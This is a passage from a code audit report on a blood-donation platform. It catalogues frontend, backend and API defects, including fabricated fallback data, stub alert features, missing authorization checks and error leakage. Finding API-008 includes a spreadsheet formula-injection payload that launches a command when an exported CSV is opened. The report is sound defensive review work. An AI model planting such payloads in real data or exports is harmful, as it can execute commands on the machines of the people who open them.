| **FE-030** | **P1** | `api/emergencyApi.ts:57` | `contactPhone: … ?? '1234567890'` | A **fake phone number** is written to `emergency_requests.contact_phone`. `RequesterEmergencyPage` collects no `contactPhone` at all, so this is what a hospital would call back |
| **FE-031** | **P1** | `api/donorApi.ts:56-57, 71-72, 86-87` | `latitude: … ?? 23.0225, longitude: … ?? 72.5714` | **Every donor without GPS is recorded at fixed Ahmedabad coordinates.** `DonorProfilePage` never collects lat/lng, so this fires on every save. Drives Haversine matching → donors appear "nearby" to hospitals that are not near them |
| **FE-032** | **P1** | `api/hospitalApi.ts:45, 57` | `registrationNumber: … ?? 'REG-' + Date.now().toString().slice(-6)` | **Fabricated registration numbers** defeat the uniqueness check and `createHospital`'s `ConflictException`. `slice(-6)` also collides across concurrent requests |
| **FE-103** | **P1** | `pages/hospital/HospitalProfilePage.tsx:36` | `registrationNumber: … ?? 'REG-HP-' + user.id.slice(-6)` | A **third** fabrication site, in the form's *default value*, so `z.string().min(1)` never blocks it |
| **FE-104** | **P1** | `components/emergency/EmergencyQuickSosModal.tsx:131` | `approximateLocation: locationStr \|\| 'Ahmedabad Trauma Center'` | The backend **parses this string to derive the persisted city** (`EmergencyOtpController.java:86-90`), so the literal becomes the city of a real emergency record |
| **FE-105** | **P1** | `pages/requester/CreateBloodRequestPage.tsx:41-42`; `api/bloodRequestApi.ts:36` | `city: … \|\| 'Ahmedabad'`, `state: … \|\| 'Gujarat'` | Backend field is `@NotBlank` → mis-attributed requests; corrupts city analytics |
| **FE-033** | P2 | `api/emergencyApi.ts:39-41` | `requiredBy: new Date(Date.now()+86400000)` | Request deadline silently set to tomorrow |
| **FE-034** | P2 | `api/emergencyApi.ts:29-30` | `let bloodRequestId = undefined; if (!bloodRequestId) {…}` | Dead guard — always true. Vestigial from a refactor |
| **FE-106** | **P1** | `pages/donor/DonorDashboardPage.tsx:120-134` | `weight ?? 65` kg, `age ?? 25` yrs, hardcoded **`56 Days`** cooldown | **The most clinically dangerous frontend finding.** Eligibility also **fails OPEN**: `profile?.isEligible !== false ? 'QUALIFIED TO DONATE'` — `undefined` renders "QUALIFIED". Should be `=== true` |
| **FE-116** | **P1** | `pages/requester/RequesterDashboardPage.tsx:169` | `h.phone \|\| '+91 79 2630 0000'` | A **made-up landline presented as a hospital's real contact** to users seeking blood |
| **FE-135** | P2 | `pages/donor/DonorContributionsPage.tsx:53-59` | `totalUnits * 3` "Lives Impacted" | An invented statistic presented as a measured KPI, beneath page copy claiming "no clinical logic lives here" |
| **FE-035** | P2 | `mocks/index.ts:419-421` | `'mock-access-token-requester'` | Gated behind `VITE_USE_MOCK_API`, and `.env.example` ships `VITE_USE_MOCK_API=true`. No build-time guard prevents shipping a fixture-backed build |

### 5.5 React correctness, state, and lifecycle defects

| ID | Severity | File:Line | Issue |
|---|---|---|---|
| **FE-113** | **P1** | `components/modals/InventoryModal.tsx:18-33`; `AppointmentModal.tsx:18-27` | `useForm({defaultValues: initialData ? … : …})` with **no `key`, no `values`, no `reset()`**. The component never unmounts (`Modal` returns `null` internally) → **editing row B shows row A's values** |
| **FE-122** | **P1** | `components/emergency/EmergencyQuickSosModal.tsx:43-49, 163-168` | `if (!isOpen) return null` sits **after** the hooks, so the component never unmounts and all PII (`name`, `phone`, `email`, `otp`) **survives close→reopen** — landing the user back on the OTP step with a stranger's details. Also **no `role="dialog"`, no `aria-modal`, no Escape handler, no focus trap** on the app's most safety-critical surface |
| **FE-115** | **P1** | `pages/donor/DonorDashboardPage.tsx:61` | `profile?.firstName ?? 'Donor'` — but `normalizeDonorProfile` produces `''` (not `undefined`) and the backend has no `firstName`, so the heading renders literally **`Welcome back, !`** |
| **FE-130** | P2 | `pages/donor/DonorProfilePage.tsx:24-33`; `HospitalProfilePage.tsx:34-42` | `useForm({ values: { weight: profile?.weight ?? 65, dateOfBirth: … ?? '1998-01-01' } })` — pressing "Save Profile" after a failed query **writes hardcoded clinical values as the donor's real record**. `values` also re-seeds on every refetch, discarding in-progress edits |
| **FE-123** | P2 | `pages/requester/RequesterRequestsPage.tsx:21-24` | `statusFilter` and `bloodGroupFilter` are in the query key (so they *look* wired) but are **never passed to `queryFn`**. Changing either re-fetches identical data |
| **FE-124** | P2 | `DonorRequestsPage`, `AdminRequestsPage` | Send `page`, `size`, `search`, `urgency`; the backend accepts only `city`, `bloodGroup`, `status`. `urgencyFilter` entirely non-functional |
| **FE-125** | P2 | `api/httpHelpers.ts:37-46` | `wrapPageResponse` hardcodes `totalPages: 1` for array responses → **every pagination control is permanently single-page** while still rendering a disabled "Next". ~10 tables silently truncate with no indication more data exists |
| **FE-126** | **P1** | `pages/hospital/HospitalAppointmentsPage.tsx:39-61` | `confirmMutation`, `completeMutation`, `cancelMutation` have **no `onError`**. A rejected confirm/complete/cancel produces no toast and no visual change: **the hospital believes a blood draw was recorded when it was not.** Same in `RequesterEmergencyDetailPage:22-36`, `RequesterRequestDetailPage:32-48` |
| **FE-127** | P2 | `pages/hospital/HospitalAppointmentsPage.tsx:92,97,102` | No `loading`/`disabled` → double-clicks fire duplicate PATCHes. The icon-only destructive cancel has **no `aria-label` and no `ConfirmDialog`**, unlike every other destructive action in the app |
| **FE-128** | P2 | ~10 pages | `useQuery`'s `error` is destructured nowhere → a failed fetch renders as a permanent empty state indistinguishable from "no data". `ErrorState`/`NetworkError` and `DataTable`'s `error` prop exist and are almost entirely unused. `DonorAppointmentsPage` is worst: `enabled: !!profile` makes `isLoading` false while the profile loads → guaranteed flash of "No donation records found" |
| **FE-129** | P2 | `HospitalDashboardPage:17-24` + 4 siblings | Bare `catch { … }` around `hospitalApi.getMe()` swallows 401/403/500 identically → a revoked hospital role silently degrades to a permanently empty page |
| **FE-134** | P2 | `RequesterDashboardPage:31-32,64,76`; `HospitalDashboardPage:98-102` | "Active/Fulfilled Requests" computed from at most the **5 most recent** then displayed as lifetime totals. A card labelled *"Today's Appointments"* counts **every** appointment ever, no date filter |
| **FE-140** | P3 | 4 × `*NotificationsPage.tsx` | Four **byte-identical** copies (~440 lines total), none using `ConfirmDialog` for the destructive delete, none with `type`/`disabled` |
| **FE-144** | P3 | 4 pages | `Promise.reject()` with **no reason** → unhandled rejections with no message or stack context |
| **FE-050** | P3 | `utils/debounce.ts` | No `.cancel()`; a pending timer still fires after unmount (dead export, so latent) |
| **FE-051** | P3 | `utils/format.ts:5,12,19` | `new Date('2026-01-01')` parses as **UTC midnight**, then formats in local time → **off-by-one day** outside IST. (Dead export, so latent — but see FE-142, where the app instead uses raw unguarded `new Date()`) |
| **FE-142** | P3 | 10+ pages | Unguarded `new Date(...)` renders `"Invalid Date"`. The correct `formatDate`/`formatDateTime` helpers that perform exactly this check **exist and are never used** |

### 5.6 Auth, routing, and HTTP-client defects

| ID | Severity | File:Line | Issue |
|---|---|---|---|
| **FE-040** | **P1** | `api/axios.ts:96-114` + `config/SecurityConfig.java:45-64` | **The token-refresh path can never trigger.** `SecurityConfig` sets no `exceptionHandling`/entry point and enables no `httpBasic`/`formLogin`, so Spring Security's default `Http403ForbiddenEntryPoint` returns **403, not 401**, for an unauthenticated request. The interceptor only refreshes on `status === 401`. An expired/absent token therefore produces 403 → no refresh → no `unauthorizedHandler` → the SPA sits on a spinner or stale data instead of redirecting to `/login` |
| **FE-041** | **P1** | `context/AuthContext.tsx:24-28, 44-48` | `logout()` and `onUnauthorized()` use `window.location.assign('/login')` — a **full page reload**. Destroys SPA state and re-downloads the 1.1 MB bundle on every session expiry |
| **FE-042** | P2 | `context/AuthContext.tsx:31, 57, 66` | Hardcoded `'redpulse.accessToken'` / `'redpulse.refreshToken'` string literals instead of `STORAGE_KEYS.*` | Key drift between two sources of truth → silent "session mysteriously lost" |
| **FE-043** | P2 | `api/axios.ts:104-106` | On **any** 401 — including a failed `/api/auth/login` — `unauthorizedHandler?.()` fires, clearing tokens and hard-navigating to `/login`. A user typing a wrong password triggers a full page reload |
| **FE-044** | P2 | `api/axios.ts:63-66` | **No `timeout`** configured on the axios instance. A hung backend request never times out; spinners run indefinitely. No abort plumbing for navigation-away |
| **FE-045** | P2 | `api/errors.ts:26-33, 44-60` | `userFacingMessage` **returns the backend's raw `message`** whenever it doesn't match `looksInternal()`. Since `GlobalExceptionHandler.handleGeneralException` puts `ex.getMessage()` there, SQL/JDBC detail reaches the user. An attacker calling the API directly bypasses the client filter entirely |
| **FE-046** | P2 | `api/reportApi.ts:15-19`; `adminApi.ts:19-24` | `responseType: 'blob'` on endpoints that can return a JSON error → a 500 becomes an opaque `Blob`; `normalizeApiError` produces a nonsense message. No blob-error unwrapping |
| **FE-047** | P2 | `hooks/useListParams.ts:12, 20-25` | `update` closes over `params`; two calls in the same tick → the second overwrites the first (stale closure). `draft` is initialised from `search` but never re-synced, so browser back/forward leaves the search box stale |
| **FE-048** | P2 | `routes/ProtectedRoute.tsx:10` | Passes `state={{ from: location.pathname }}` but **no page consumes `state.from`**. Post-login the user is dumped at the role home → **deep links into dashboards are lost** |
| **FE-049** | P2 | `routes/AppRoutes.tsx` (all imports) | **Zero `React.lazy` / dynamic import.** 37 page modules are eagerly bundled → the 1,105 kB single chunk |
| **FE-139** | P3 | `routes/AppRoutes.tsx:146,168`; `constants/nav.ts` | `/hospital/notifications` and `/admin/notifications` are routed and fully implemented but appear in **no `roleNav` entry**; `DashboardLayout:53-54` sets `notificationsPath = undefined` for both roles. **Two complete pages are unreachable** |
| **FE-052** | P3 | `constants/env.ts:2` | `import.meta.env.VITE_API_BASE_URL ?? 'http://localhost:8080'` uses `??` — an **empty-string** env var (very common: `VITE_API_BASE_URL=`) yields `baseURL: ''`, not the fallback. Should be `||` |
| **FE-053** | P3 | `index.html:10-14` | Google Fonts from a third-party CDN; **no CSP anywhere** in the app or the backend |

### 5.7 Accessibility

| ID | Severity | Location | Issue |
|---|---|---|---|
| **FE-120** | P2 | 9 sites: `RequesterRequestsPage:96,111`, `AdminUsersPage:146,163`, `AdminRequestsPage:118,136,150`, `AdminDonationsPage:104,120`, `DonorDonationsPage:85` | `<Select label="">` — `Fields.tsx:17` renders the label only when truthy, so these emit a `<select>` with **no accessible name at all** |
| **FE-121** | P2 | `pages/donor/DonorDashboardPage.tsx:66-78` | The availability toggle has no `type`, no `aria-label`, no `role="switch"`/`aria-checked` — state is conveyed by **colour alone**. A correct `Switch` component exists at `Fields.tsx:131-164` and is **never used** |
| **FE-117** | **P1** | `pages/public/ErrorPages.tsx:10-12` | `<Button onClick={() => undefined}><Link to="/">Back home</Link></Button>` — interactive `<a>` nested inside `<button>`: invalid HTML, unpredictable screen-reader behaviour. On the **404 page**, i.e. the highest-traffic instance. `onClick` is dead code |
| **FE-136** | P2 | `components/forms/Fields.tsx:24-28, 42, 56, 69` | Form errors use `role="alert"` but inputs get **no `aria-invalid` and no `aria-describedby`**, and the error `<p>` has no `id`. Affects every validated form in the app |
| **FE-146** | P2/P3 | 9 sites: `AdminUsersPage:135-137`, `AdminDonorsPage:125-127`, `AdminHospitalsPage:87-89`, `AdminRequestsPage:107-109`, `AdminDonationsPage:93-95`, `AdminAuditLogsPage:94-96`, `HospitalRequestsPage:83-85`, `RequesterRequestsPage:88-90`, `DonorDonationsPage:77-79` | `Input` with no `label` renders no `<label>`; only the `placeholder` names the control — below the accessible-name bar for a primary filter |

### 5.8 Placeholder / fake-success UI

| ID | Severity | Location | Issue |
|---|---|---|---|
| **FE-132** | P2 | `pages/auth/AuthPages.tsx:104-111` | The hospital licence upload is an explicit **no-op**: the file is discarded, the URL blanked, yet a green "Local review only" chip is shown. A hospital admin will reasonably believe accreditation was submitted |
| **FE-133** | P2 | `pages/public/ContentPages.tsx:135-148` | The public contact form fires `toast.success('Message saved locally…')` with **no API call, no storage, no network**. A fake success on a public page |
| **FE-131** | P2 | `pages/auth/AuthPages.tsx:22-25, 53-63, 124` | UI labels claim *"Must be 18+"* and *"Min 45kg"* but the schema is `z.string().optional()` / `z.number().optional()` — **no 18+ check, no weight minimum** — and those 6 donor fields have **no `error` prop**, so a validation failure shows no message at all |
| **FE-114** | **P1** | `pages/admin/AdminAuditLogsPage.tsx:85-87`; `AdminReportsPage.tsx:110-121` | `handleExport('pdf')` writes a file named `*-report.pdf` containing the backend's `text/csv` body |

### 5.9 Text-encoding corruption (mojibake) in user-visible strings

| ID | Severity | File:Line | Corrupted | Should be |
|---|---|---|---|---|
| **FE-060** | P2 | `constants/blood.ts:41` | `…even a few units can change a hospital�?Ts readiness.` | `hospital's` |
| **FE-061** | P2 | `utils/format.ts:5, 12, 19` | `return '�?";` (×3 — the empty-value placeholder) | `—` |
| **FE-062** | P2 | `DonorContributionService.java:110-111` | `"dY�� Gold Champion"`, `"dY�^ Silver Lifesaver"`, `"dY�% Active Donor"` | symbol prefixes |

All three are rendered directly to end users. Note: a page/component-level scan found **zero** mojibake inside `src/pages` and `src/components` — the corruption is confined to these three locations.

### 5.10 Dead assets and dead exports

**Unused tracked assets (0 references, verified):** `src/assets/hero.png` (12.8 KB), `src/assets/typescript.svg`, `src/assets/vite.svg`.

**22 dead frontend exports:** `useListParams` (entire hook), `debounce` (entire module), `formatDate`, `formatDateTime`, `formatDistance`, `NetworkError`, `LoadingOverlay`, `Tooltip`, `Dropdown`, `FilterBar`, `Tabs`, `Checkbox`, `Radio`, `Switch`, `SearchInput`, `seedNotification`, `DEMO_BANNER`, `URGENCY_LABELS`, `ReportFormat`, `DonationRequest`, `toNetworkError`, `userApi`.

Seven of these are **accessibility/UI primitives that were clearly built for use and never wired** (`Switch`, `Checkbox`, `Radio`, `SearchInput`, `FilterBar`, `Tabs`, `NetworkError`) — the same "capability built, never connected" pattern as the backend stubs, and the direct cause of FE-120 and FE-121. `Switch` also uses `left-5.5`, a non-existent Tailwind token.

**Other dead code:** `schemas/index.ts` — `locationSchema` (city/state) is dead (the location endpoints take lat/long); `emergencySchema`/`hospitalSchema` are aliases never imported; `reportFilterSchema` is dead (backend takes no params). `appointmentSchema.donorId` is dead (backend derives the donor from the JWT).

---

## 6. Backend Issues

### 6.1 Business-logic defects

| ID | Severity | File:Line | Issue | Root Cause | Impact |
|---|---|---|---|---|---|
| **BE-100** | **P0** | `modules/request/service/MatchingService.java:118-131` | **`notifyDonor` is a stub.** It validates both IDs exist, then returns `{"status":"NOTIFICATION_DISPATCHED","message":"Donation request notification sent to donor successfully"}` — and sends nothing. No `NotificationService` is even injected | Feature never implemented; success response hardcoded | **The platform tells the user a donor was alerted when no alert occurred.** Blood-request context → safety-critical lie. Spec §2 Role 1/2 requires this |
| **BE-101** | **P0** | `modules/request/service/EmergencyRequestService.java:66-79` | **`alertDonors` is a stub.** Sets status to `ALERT_SENT` and returns `"Emergency SOS broadcast dispatched to nearby eligible donors"`. Nothing is dispatched | Same | **The emergency broadcast — the product's headline feature — does not exist.** `EmergencyOtpController:101` also pre-sets `ALERT_SENT`, so the UI shows "alerted" for every emergency |
| **BE-102** | **P1** | `modules/inventory/service/InventoryService.java:110-112` | **`getExpiringUnits` returns `Collections.emptyList()`** and there is **no `expiry_date` column** on `blood_inventory` | Feature never implemented | Blood-product expiry tracking — a core blood-banking safety control — is absent. `inventoryApi.expiring()` and the `expiryDate` form field are decorative |
| **BE-103** | **P1** | `modules/donation/service/DonationService.java:179-184` | **Cancelling a COMPLETED donation is permitted.** `cancelDonation` sets `CANCELLED` with **no status guard** | Missing state-machine check | Inventory was already incremented, the donor already marked unavailable, notifications already sent — but the record now reads CANCELLED. **Stock permanently inflated; donor cooldown wrongly applied; analytics wrong** |
| **BE-104** | **P1** | `modules/donation/service/DonationService.java:60-88` | **`POST /api/donations` performs no authorization and no identity validation.** `donorId`, `hospitalId` and `bloodGroup` are all client-supplied; the donor's role, verification, eligibility and actual blood group are never checked | No principal, no ownership check | Any authenticated user (including another donor) can forge unlimited donation records for any donor/hospital/blood group, with any quantity. **Corrupts donor eligibility, badges, inventory, and the legal donation ledger simultaneously** |
| **BE-105** | **P1** | `Donation.java` (no `@Version`); `DonationService.java:120-127` | **Non-atomic read-modify-write.** `if (d.getStatus() == COMPLETED) return;` then set + save | No optimistic locking, no `SELECT … FOR UPDATE` | Two concurrent completes both pass the early-return check → **inventory incremented twice** for one donation |
| **BE-106** | **P1** | `UserProfileService.java:150-176` vs `UserService.java:143-183` | **Two divergent implementations of donor eligibility.** Live: age 18–65 **and** weight ≥ **50 kg**. Dead: weight ≥ **45 kg**, **no age check at all** | Copy-paste divergence; the arbitrary copy survived | The rule that actually governs matching, availability and donation completion has no single owner and no test |
| **BE-107** | **P1** | `UserProfileService.java:150-176` | **`updateAvailability` does not check eligibility**, unlike the dead `UserService.updateAvailability` (`UserService.java:143-152`) which throws if setting AVAILABLE while ineligible | The guard lives only in the orphaned class | **Any donor can set themselves `AVAILABLE` while under cooldown, under 50 kg, or under 18**, and will then be matched and alerted by `MatchingService.getRankedMatches`. **The safety check exists in the codebase — in code that is never called** |
| **BE-108** | P1 | `DonationService.java:157-163` | Badges computed by re-querying and filtering all donations in Java on every completion; the `else` branch yields `badge = null` so donors 2,4,6,7,8,9 get nothing | Magic-number cascade, not a milestone table | Inconsistent rewards; spec §2 requires a badge/milestone system |
| **BE-109** | **P1** | `AppointmentService.java:63-91` | **`createAppointment` has no date validation and no conflict detection** unless `bloodRequestId` is supplied. Past dates, double-booking the same donor+hospital+slot, and unlimited concurrent appointments are all accepted | Missing validation | Clinic scheduling integrity is not enforced at all |
| **BE-110** | **P1** | `DonationService.java:60-88` | Donation `bloodGroup` comes from the client and is never reconciled with `donorProfile.bloodGroup`; a donor can "donate" a group they do not have | No cross-check | The compatibility invariant the whole matching engine depends on is unenforced at the point of data entry |
| **BE-111** | P2 | `V4__create_appointments_and_donations.sql:38` vs `Donation.java:47` | DDL default `status DEFAULT 'COMPLETED'`; JPA field/constructor default `SCHEDULED` | Schema/entity disagreement | Any insert omitting `status` (raw SQL, a fix script, a future path) silently records a donation as **COMPLETED** without inventory or notifications |
| **BE-112** | P2 | `AuthService.java:151-176` vs `:324-355` | Donor registration validation **duplicated verbatim** (blood group, DOB/18-years, gender enum, weight 45–250) in `validateRegistration` *and* inline in `register` | Copy-paste | Two copies of a clinical validation rule. The inline copy also throws `BadRequestException` from inside a `catch (DateTimeParseException \| IllegalArgumentException)` — correct only because `BadRequestException extends RuntimeException`, a fragile coupling |
| **BE-113** | **P1** | `AuthService.java:127` | `user.setVerified(role != Role.HOSPITAL)` — donors are marked verified at registration, and **there is no email-verification flow anywhere** | Missing feature | Every donor is "verified" without any identity check. `AdminService.verifyDonor` then re-verifies an already-verified user |
| **BE-114** | P2 | `AuthService.java:170` | `profile.setGender(request.getGender().trim())` stores the **raw** value while validating an upper-cased copy | Validation/persistence mismatch | `"male"`, `"Male"`, `"MALE"` all persist; grouping by gender is unreliable |
| **BE-115** | P2 | `AuthService.java:131-150` | Hospital registration via `/api/auth/register` does **not** check `registrationNumber` uniqueness (unlike `HospitalService.createHospital`) | Missing check | Duplicate registration number → `DataIntegrityViolationException` → **HTTP 500** instead of 409 |
| **BE-116** | P2 | `MatchingService.java:41-44, 88-91, 109-112` | **Hardcoded fallback coordinates `23.0225, 72.5714` (Ahmedabad)** used as the match origin whenever a hospital has no GPS | Magic constants | Every hospital without coordinates matches against Ahmedabad. Donors elsewhere are unreachable; Ahmedabad donors are spuriously matched |
| **BE-117** | P2 | `MatchingService.java:60-88` | `getRankedMatches` filters on `AvailabilityStatus` and blood-group compatibility but **never checks donor eligibility** (age, weight, 90-day cooldown) | Missing rule | Ineligible donors are ranked, returned, and (per BE-107) can be self-marked available |
| **BE-118** | P2 | `InventoryService.java:92-108` | `updateStock` `switch` has `case "ADD"`, `case "DEDUCT"`, then `default -> SET` with **no validation of `action`** | Silent default | A typo (`"INCREMENT"`, `"add "`, any unknown value) **silently overwrites stock to the submitted value** instead of erroring. Destructive and silent |
| **BE-119** | P2 | `InventoryService.java:76-88` | `addOrInitializeInventory` read-modify-write with no locking | No `@Version` | Concurrent donation completions lose increments (lost update) |
| **BE-120** | P2 | `InventoryService.java:66-74` | `PUT /{inventoryId}` can change `bloodGroup` to one that already exists for the same hospital | No pre-check | Violates `uq_hospital_blood_group` → **500** |
| **BE-121** | P2 | `InventoryService.java:122-126` | `validateHospital` uses `findById`, ignoring `is_active` | Soft-delete not respected | Soft-deleted hospitals remain fully writable |
| **BE-122** | P2 | `DonorContributionService.java:101-131` | `getStatistics` aggregates **all** donations; `getContributionSummary` aggregates **only COMPLETED** | Inconsistent metrics | The same donor's "total donations" differs between `/statistics` and `/contributions` on one dashboard |
| **BE-123** | P2 | `DonorContributionService:126`, `AdminService:180`, `MatchingService:66-81` | `getBloodGroup().name()` with **no null guard**, though `DonorProfileResponse.fromEntity` and the DDL both handle null defensively | Inconsistent null handling | NPE → 500 on the leaderboard, admin donor list, and blood-group analytics. `donor_profiles.blood_group` is `NOT NULL` in DDL but nullable in the entity |
| **BE-124** | P2 | `AdminService.java:238-244` | `getAllDonors` hardcodes `isEligible=true, reason="Active Donor"` for every donor | Placeholder | The admin donor roster shows every donor as eligible regardless of the real rule — **misleading a compliance officer** |
| **BE-125** | P2 | `AdminService.java:246-252` | `blockUser` has **no self-check and no role check** | Missing guard | An admin can block themselves or the last admin, with no recovery path outside the DB |
| **BE-126** | P2 | `AdminService.java:96-101` | `recordAudit` hardcodes `ipAddress = "127.0.0.1"` | Placeholder never replaced | **The audit log's IP column is fabricated.** Defeats the forensic purpose the spec assigns it |
| **BE-127** | P2 | `NotificationService.java:78-82` | `deleteNotification` has **no ownership check** (contrast `markAsRead:52-56`, which checks correctly) | Inconsistency | Any authenticated user can delete any notification |
| **BE-128** | P2 | `NotificationService.java:71-76` | `sendNotification` silently no-ops if the user does not exist | Design | Notification loss is invisible — no metric, no log, no error |
| **BE-129** | P2 | `V2` (donor_profiles) | No `total_donations` column; spec §6 step 3 requires it to increment | Missing field | Recomputed on every read via full-table scans (PERF-004) |
| **BE-130** | **P1** | `AppointmentController.java:66` → `AppointmentService.java:145-152` | `completeAppointment(id)` takes **no actor** — there is no hospital/admin check | Missing principal | Any authenticated user can complete any appointment |
| **BE-131** | P3 | `Appointment.java` | `NO_SHOW` status exists in the enum but **no code path ever sets it** | Unimplemented | Spec §2 Role 3 requires the `NO_SHOW` transition |
| **BE-132** | P3 | `RedPulseApplication.java:21-40` | `loadEnv()` parses `.env` into **System properties**; `catch (Exception ignored) {}` swallows all failures | Redundant + silent | Two competing config mechanisms (`loadEnv()` **and** `spring.config.import: optional:file:.env[.properties]`) with different failure semantics; secrets land in `-D`-visible system properties; a malformed `.env` fails with no diagnostic |
| **BE-133** | P3 | `config/SwaggerAutoOpen.java:14-38` | Opens a browser on `ApplicationReadyEvent` in **every** profile; uses `System.out`/`System.err` | Missing `@Profile("dev")` | Production log noise; a desktop browser launch attempt wherever `Desktop` is supported |
| **BE-134** | P3 | `GlobalExceptionHandler.java` + all entities | `timestamp` is `LocalDateTime.now()` (server-local, no zone); entities also use `LocalDateTime.now()` | No UTC discipline | Timestamps are ambiguous across regions; `audit_logs.created_at` cannot be correlated with external logs |
| **BE-135** | P2 | `HospitalController.java:22-24`; `EmergencyOtpController.java` imports | Unused imports (`Collections`, `PageResponse`-shaped leftovers) | Dead imports | Minor, but indicative of unreviewed copy-paste |

### 6.2 Error handling — confirmed defects

| ID | Severity | File:Line | Issue |
|---|---|---|---|
| **BE-140** | **P1** | `GlobalExceptionHandler.java` | **`ForbiddenException` has no `@ExceptionHandler`.** Verified — the 8 registered handlers are `ResourceNotFound`, `MethodArgumentNotValid`, `BadRequest`, `InsufficientStock`, `Conflict`, `Unauthorized`, `Exception`, `OtpException`. `ForbiddenException` falls through to `handleGeneralException` → **HTTP 500, not 403.** Triggered by `DonationService.verifyDonation` (non-hospital calling `/complete`), `AppointmentService.ensureHospitalOrAdmin`, `NotificationService.markAsRead` (marking someone else's notification). **A legitimate authorisation denial is reported to the client as a server error** |
| **BE-141** | **P1** | `GlobalExceptionHandler.java:82-91` | `handleGeneralException` returns **`ex.getMessage()` verbatim** to the client. Leaks SQL/JDBC/Hibernate internals, table and column names, and absolute file paths. The frontend's `looksInternal()` filter (FE-045) is bypassed by calling the API directly |
| **BE-142** | **P1** | `GlobalExceptionHandler.java` | **Zero logging.** 8 `log.*` calls exist in the entire backend; `GlobalExceptionHandler` has none. Every 500 is returned to the user and **discarded** — no stack trace reaches any log. Undetectable production failures; directly contradicts spec §2 Role 4 |
| **BE-143** | **P1** | `GlobalExceptionHandler.java` | No handler for `HttpMessageNotReadableException` (malformed JSON → 500, not 400), `MethodArgumentTypeMismatchException` (bad enum/UUID in a path or query → 500, not 400), `ConstraintViolationException`, `MissingServletRequestParameterException`, `HttpRequestMethodNotSupportedException`, `DataIntegrityViolationException`, or Spring Security's `AccessDeniedException`. **Every one of these user-input errors becomes an opaque 500** |
| **BE-144** | **P1** | `JwtAuthenticationFilter.java:52-56, 92-94` | **Two empty `catch (Exception exception) {}` blocks.** Token parse failures and DB errors are silently swallowed. A database outage during authentication degrades into "401 Unauthorized" instead of "503" — unactionable for on-call and actively misleading during an incident |
| **BE-145** | P2 | `EmergencyEmailOtpService.java:104-115` | `sendEmail` failure throws `BadRequestException` (400) — the caller is told **their request was malformed** when the SMTP server is down | Wrong status | Masks a mail outage as a user error. Should be 502/503 |
| **BE-146** | P2 | `InventoryController.java:79` | `getExpiringUnits` returns `List<Object>` | Untyped API | No contract, no OpenAPI schema |
| **BE-147** | P2 | `AuthController.java:72, 82` | `forgotPassword`/`resetPassword` return `ResponseEntity<String>` (bare text) while every other endpoint returns JSON | Inconsistent API | Breaks the client's single `normalizeApiError`/`ApiResponse` contract |
| **BE-148** | P2 | `EmergencyOtpController.java:68-72` | `verifyOtp` returns 200 with `{success:false, errorCode:"OTP_INVALID"}` for a bad OTP, while `GlobalExceptionHandler.handleOtpException` returns **400** for the same condition | Inconsistent semantics | Callers cannot distinguish "wrong OTP" from "malformed request" by status code |

### 6.3 Layering and structural problems

| ID | Severity | Issue |
|---|---|---|
| **BE-150** | **P1** | **Business logic in controllers.** `EmergencyOtpController` contains the entire SOS orchestration: OTP consumption, account resolution/provisioning, request creation, emergency creation, JWT minting, response assembly — ~55 lines of logic, annotated `@Transactional`. **This is where the P0 lives.** A `SOSService` does not exist |
| **BE-151** | P2 | **Direct repository access from a controller.** `DonorContributionController:27` injects `DonorProfileRepository` purely for the `resolveDonorId` lookup, bypassing the service layer |
| **BE-152** | P2 | **Three different authorization patterns coexist** with no single auditable policy location: class-level `@PreAuthorize` (admin), method-level `@PreAuthorize` (hospital delete), and hand-rolled `if (role != X) throw` inside services (`DonationService`, `AppointmentService.ensureHospitalOrAdmin`, `UserService`). **The direct cause of the 35-endpoint gap** |
| **BE-153** | P2 | `getRankedMatches` / `getNearbyMatches` / `startMatching` are **three endpoints returning the identical result** (`MatchingController:25,34,43`) differing only in default radius; `/matches` and `/matches/nearby` likewise. API surface inflation with no behavioural difference |
| **BE-154** | P2 | `AdminService` is 250 lines mixing five concerns: audit-log reads, CSV serialisation, analytics aggregation, user governance, donor verification. No separation |
| **BE-155** | P2 | `UserProfileService.calculateEligibility` encodes 4 magic constants (18, 65, 50, 90) inline and duplicates the dead `UserService` version |
| **BE-156** | P2 | No `ResourceOwnership` abstraction; no specification objects for the admin search filter (in-Java `contains()`) |

---

## 7. API Issues

| ID | Severity | Location | Issue |
|---|---|---|---|
| **API-001** | **P1** | All list endpoints | **No pagination, filtering, or sorting exists.** Verified: zero occurrences of `Pageable`, `PageRequest`, `Page<`, `Slice<`, `Offset`, `maxResults` in the backend. The only `limit` is a stock threshold. `GET /api/donations`, `/api/appointments`, `/api/blood-requests`, `/api/notifications`, `/api/emergency-requests`, `/api/hospitals`, `/api/admin/users`, `/api/donors/leaderboard` all return the **entire table** |
| **API-002** | **P1** | Global | **No API versioning.** Everything under bare `/api/**`. Frontend and backend cannot be deployed independently — any contract change is a coordinated outage |
| **API-003** | **P1** | Global | **No rate limiting on any endpoint.** Verified: no Bucket4j, no resilience4j, no custom filter. `/api/auth/login` and `/api/auth/register` are unthrottled (no lockout, no IP throttle, no CAPTCHA) despite BCrypt being deliberately expensive |
| **API-004** | **P1** | Global | **No idempotency keys** on any mutating endpoint. `POST /api/donations`, `/api/appointments`, `/api/blood-requests` and the emergency dispatch are all non-idempotent; a client retry (or the axios `_retry` replay) creates duplicate records |
| **API-005** | P2 | `config/SecurityConfig.java:58-61` | `/swagger-ui/**` and `/v3/api-docs/**` are `permitAll` **in every profile** | Full API surface disclosure in production, including the emergency endpoint's exact request shape |
| **API-006** | P2 | `AdminController.java:42-47, 86-113` | CSV exports return `MediaType.TEXT_PLAIN` with no `charset`; filenames inconsistent (`attachment; filename=` on audit logs, **no `Content-Disposition` at all** on the six `/reports/*` endpoints) | The client cannot derive a filename for 6 of 7 exports |
| **API-007** | P2 | `AdminService.java:104-113, 189-231` | **CSV built with `String.format` and no escaping.** Only the audit-log export quotes `description`; the other six emit raw values. A hospital name containing a comma shifts every subsequent column | Corrupted reports |
| **API-008** | **P1** | `AdminService.java:189-231` | **CSV/formula injection.** No field is sanitised against a leading `=`, `+`, `-`, or `@` | A hospital named `=cmd\|'/c calc'!A1` executes in Excel/Sheets when an admin opens the export. Admin-only reachability, but a standard attack against exactly this feature |
| **API-009** | P2 | `BloodRequestCreateRequest.java:19` | `unitsRequired` has `@Min(1)` but **no `@Max`**; the frontend caps at 20 client-side only | API bypass — a direct caller can request 2,000,000 units |
| **API-010** | P2 | `DonationCreateRequest.java:24` | `quantityUnits` has `@Min(1)`, no `@Max`; `Donation` clamps with `Math.max(1, …)` | Unbounded inventory inflation via a direct API call |
